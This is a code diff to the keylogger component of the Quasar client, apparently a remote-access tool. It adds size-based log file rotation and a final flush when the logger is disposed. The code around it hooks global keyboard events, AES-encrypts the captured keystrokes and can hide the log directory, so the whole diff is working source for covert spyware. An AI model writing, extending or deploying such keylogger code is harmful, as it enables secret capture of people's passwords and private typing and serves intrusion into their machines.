@@ -32,7 +32,7 @@ namespace Quasar.Client.Logging
         private readonly Timer _timerFlush;
 
         /// <summary>
-        /// The 
+        /// The buffer used to store the logged keys in memory.
         /// </summary>
         private readonly StringBuilder _logFileBuffer = new StringBuilder();
 
@@ -67,11 +67,18 @@ namespace Quasar.Client.Logging
         private readonly Aes256 _aesInstance = new Aes256(Settings.ENCRYPTIONKEY);
 
         /// <summary>
+        /// The maximum size of a single log file.
+        /// </summary>
+        private readonly long _maxLogFileSize;
+
+        /// <summary>
         /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
         /// </summary>
         /// <param name="flushInterval">The interval to flush the buffer from memory to disk.</param>
-        public Keylogger(double flushInterval)
+        /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
+        public Keylogger(double flushInterval, long maxLogFileSize)
         {
+            _maxLogFileSize = maxLogFileSize;
             _mEvents = Hook.GlobalEvents();
             _timerFlush = new Timer { Interval = flushInterval };
             _timerFlush.Elapsed += TimerElapsed;
@@ -106,6 +113,7 @@ namespace Quasar.Client.Logging
                 _timerFlush.Stop();
                 _timerFlush.Dispose();
                 _mEvents.Dispose();
+                WriteFile();
             }
 
             IsDisposed = true;
@@ -304,10 +312,10 @@ namespace Quasar.Client.Logging
         /// </summary>
         private void WriteFile()
         {
-            // TODO: large log files take a very long time to read, decrypt and append new logs to
+            // TODO: Add some house-keeping and delete old log entries
             bool writeHeader = false;
 
-            string filename = Path.Combine(Settings.LOGSPATH, DateTime.Now.ToString("MM-dd-yyyy"));
+            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.Now.ToString("MM-dd-yyyy"));
 
             try
             {
@@ -319,7 +327,24 @@ namespace Quasar.Client.Logging
                 if (Settings.HIDELOGDIRECTORY)
                     di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
 
-                if (!File.Exists(filename))
+                int i = 1;
+                while (File.Exists(filePath))
+                {
+                    // Large log files take a very long time to read, decrypt and append new logs to,
+                    // so create a new log file if the size of the previous one exceeds _maxLogFileSize.
+                    long length = new FileInfo(filePath).Length;
+                    if (length < _maxLogFileSize)
+                    {
+                        break;
+                    }
+
+                    // append a number to the file name
+                    var newFileName = $"{Path.GetFileName(filePath)}_{i}";
+                    filePath = Path.Combine(Settings.LOGSPATH, newFileName);
+                    i++;
+                }
+
+                if (!File.Exists(filePath))
                     writeHeader = true;
 
                 StringBuilder logFile = new StringBuilder();
@@ -340,7 +365,7 @@ namespace Quasar.Client.Logging
                     logFile.Append(_logFileBuffer);
                 }
 
-                FileHelper.WriteLogFile(filename, logFile.ToString(), _aesInstance);
+                FileHelper.WriteLogFile(filePath, logFile.ToString(), _aesInstance);
 
                 logFile.Clear();
             }
